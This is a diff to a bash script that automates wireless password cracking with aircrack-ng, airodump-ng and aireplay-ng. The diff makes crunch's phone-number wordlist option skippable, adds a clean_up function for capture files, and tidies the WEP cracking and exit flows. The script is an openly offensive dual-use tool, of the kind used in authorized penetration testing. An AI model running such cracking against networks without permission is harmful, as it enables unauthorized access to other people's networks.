@@ -104,13 +104,17 @@ echo "------- Cell Phone number generator, using crunch. -------"
 echo
 read -p "Enter Phone Number digit length : " LENGTH
 read -p "Enter Cell Phone prefix : " PREFIX
-read -p "Enter number of recurring digits : " RECURRING
+read -p "Enter number of recurring digits (Press Enter to skip) : " RECURRING
 TMP_1=$(echo ${#PREFIX})
 TMP_2=$(expr $LENGTH - $TMP_1 + 1)
 TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
 TMP_4=$(echo $TMP_3 | sed 's/%/X/g')
 SUFFIX=".lst"
-crunch $LENGTH $LENGTH -d $RECURRING -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
+if [[ -z "$RECURRING" ]]; then
+    crunch $LENGTH $LENGTH -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
+else
+    crunch $LENGTH $LENGTH -d $RECURRING -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
+fi
 GEN=$(echo $?)
 if [[ "$GEN" -eq 0 ]]; then
     echo "Wordlist successfully generated."
@@ -258,6 +262,10 @@ if [[ "$ANSWER" = y ]]; then
     done
 fi
 echo
+echo "You need the $ESSID.cap file in order to feed it to aircrack-ng and brute-force the password. Consider keeping it."
+read -p "Press Enter to continue..." KEY
+clean_up
+echo
 read -p "Press Enter to go back" KEY
 PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
 kill $PID
@@ -267,6 +275,23 @@ unset AIRODUMP
 unset CHAN
 unset BSSID
 go_back
+}
+function clean_up {
+echo
+read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR
+read -p "Keep $ESSID.cap file ? [yn] " ANS
+if [[ "$ASR" = y && "$ANS" = y ]]; then
+    rm -f $ESSID*.netxml
+    rm -f $ESSID*.csv
+    rm -f replay*.cap
+elif [[ "$ASR" = y && "$ANS" = n ]]; then
+    rm -f $ESSID*.netxml
+    rm -f $ESSID*.cap
+    rm -f $ESSID*.csv
+    rm -f replay*.cap
+elif [[ "$ASR" = n ]]; then
+    :
+fi
 }
 function crack_wep {
 clear
@@ -301,13 +326,7 @@ if [[ -z "$SUCCESS" ]]; then
     echo
     echo "In some cases rebooting your computer usually fixes the Association failure."
     echo
-    read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ?" ASR
-    if [[ "$ASR" = y ]]; then
-        rm -f $ESSID*.cap
-        rm -f $ESSID*.netxml
-        rm -f $ESSID*.csv
-        rm -f replay*.cap
-    fi
+    clean_up
     PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
     kill $PID
     PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
@@ -320,9 +339,9 @@ if [[ -z "$SUCCESS" ]]; then
     read -p "Press Enter to go back" KEY
     go_back
 fi
-echo "Wait for #Data in airodump-ng to reach at least 15k"
-sleep 2
+echo "Wait for #Data in airodump-ng to reach at least 15K..."
 echo
+sleep 20
 read -p "Try cracking $ESSID now ? [yn] : " ANSWER
 if [[ "$ANSWER" = y ]]; then
     readarray -t FILES < <(find `pwd` -name "*.cap")
@@ -344,14 +363,7 @@ if [[ "$ANSWER" = y ]]; then
     env -u SESSION_MANAGER xterm -hold -e $COMMAND &
     clear
     echo "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX)..."
-    echo
-    read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ?" ASR
-    if [[ "$ASR" = y ]]; then
-        rm -f $ESSID*.cap
-        rm -f $ESSID*.netxml
-        rm -f $ESSID*.csv
-        rm -f replay*.cap
-    fi
+    clean_up
     echo
     read -p "Press Enter to exit and go back" KEY
     PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
@@ -369,7 +381,7 @@ if [[ "$ANSWER" = y ]]; then
     unset BSSID
     go_back
 elif [[ "$ANSWER" = n ]]; then
-    echo
+    clean_up
     read -p "Press Enter to exit and go back" KEY
     PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
     kill $PID
@@ -585,11 +597,7 @@ do
             break
             ;;
         q )
-            echo
-            echo "Exiting..."
-            if [[ -n "$STATE" ]]; then
-                unset_mon >> /dev/null
-            fi
+            clear
             exit 0
             ;;
         * )
@@ -667,11 +675,7 @@ do
             break
             ;;
         q )
-            echo
-            echo "Exiting..."
-            if [[ -n "$STATE" ]]; then
-                unset_mon >> /dev/null
-            fi
+            clear
             exit 0
             ;;
         * )
